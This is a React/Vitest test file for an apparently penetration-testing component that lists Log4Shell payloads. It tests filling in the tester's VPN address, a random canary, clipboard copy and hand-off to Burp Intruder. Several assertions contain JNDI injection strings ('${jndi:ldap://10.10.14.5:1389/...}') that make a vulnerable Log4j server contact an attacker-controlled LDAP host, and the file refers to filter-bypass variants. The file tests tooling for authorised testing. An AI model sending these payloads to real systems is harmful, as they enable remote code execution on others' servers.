// @vitest-environment jsdom
import { cleanup, fireEvent, render, screen, waitFor, within } from "@testing-library/react";
import { afterEach, expect, it, vi } from "vitest";
import Log4ShellPayloadReference from "./Log4ShellPayloadReference";
import { log4shellPayloadCategories } from "./log4shellPayloads";

const basic = log4shellPayloadCategories.find((category) => category.id === "basic")!;

function stubVpnStatus(tun0 = "10.10.14.5") {
  return vi.fn((input: RequestInfo | URL) => {
    if (String(input).endsWith("/api/vpn/status")) {
      return Promise.resolve(new Response(JSON.stringify({ tun0 }),
        { headers: { "Content-Type": "application/json" } }));
    }
    throw new Error(`Unhandled request: ${input}`);
  });
}

afterEach(() => {
  cleanup();
  vi.unstubAllGlobals();
});

it("renders every payload category as a copyable reference, not an auto-scanning form", async () => {
  vi.stubGlobal("fetch", stubVpnStatus());
  render(<Log4ShellPayloadReference />);

  expect(screen.getByText("기본 JNDI 프로브")).toBeTruthy();
  expect(screen.getByText("문자열 필터 우회")).toBeTruthy();
  await screen.findByText(/^10\.10\.14\.5$/);
});

it("fills LHOST from tun0, a default LPORT, and a generated CANARY into every payload", async () => {
  vi.stubGlobal("fetch", stubVpnStatus("10.10.14.5"));
  render(<Log4ShellPayloadReference />);

  const ldapRow = await screen.findByText(/\$\{jndi:ldap:\/\/10\.10\.14\.5:1389\//);
  expect(ldapRow.textContent).toMatch(/^\$\{jndi:ldap:\/\/10\.10\.14\.5:1389\/[a-z0-9]{8}\}$/);
});

it("re-rolling CANARY changes every rendered payload", async () => {
  vi.stubGlobal("fetch", stubVpnStatus());
  render(<Log4ShellPayloadReference />);
  await screen.findByText(/^10\.10\.14\.5$/);
  const before = screen.getByLabelText(/CANARY/).getAttribute("value");

  fireEvent.click(screen.getByText("CANARY 새로 생성"));

  await waitFor(() =>
    expect(screen.getByLabelText(/CANARY/).getAttribute("value")).not.toBe(before));
});

it("copies a resolved payload to the clipboard without sending any network request beyond vpn/status", async () => {
  const writeText = vi.fn(() => Promise.resolve());
  vi.stubGlobal("navigator", { ...navigator, clipboard: { writeText } });
  const fetcher = stubVpnStatus();
  vi.stubGlobal("fetch", fetcher);
  render(<Log4ShellPayloadReference />);
  await screen.findByText(/^10\.10\.14\.5$/);

  fireEvent.click(screen.getAllByText("복사")[0]);

  await waitFor(() => expect(writeText).toHaveBeenCalledTimes(1));
  expect(fetcher).toHaveBeenCalledTimes(1);
});

it("hides the Intruder handoff buttons when no handler is given", () => {
  vi.stubGlobal("fetch", stubVpnStatus());
  render(<Log4ShellPayloadReference />);

  expect(screen.queryByText("Intruder로")).toBeNull();
  expect(screen.queryByText(/Intruder 후보로 보내기/)).toBeNull();
});

it("stages every resolved payload in a category for Intruder in one click", async () => {
  vi.stubGlobal("fetch", stubVpnStatus("10.10.14.5"));
  const onSendToIntruder = vi.fn();
  render(<Log4ShellPayloadReference onSendToIntruder={onSendToIntruder} />);
  await screen.findByText(/^10\.10\.14\.5$/);
  const category = within(screen.getByText(basic.title).closest("details")!);

  fireEvent.click(category.getByText(/카테고리 전체를 Intruder 후보로 보내기/));

  expect(onSendToIntruder).toHaveBeenCalledTimes(1);
  const sent = onSendToIntruder.mock.calls[0][0] as string[];
  expect(sent).toHaveLength(basic.payloads.length);
  expect(sent[0]).toBe("${jndi:ldap://10.10.14.5:1389/" +
    screen.getByLabelText(/CANARY/).getAttribute("value") + "}");
});
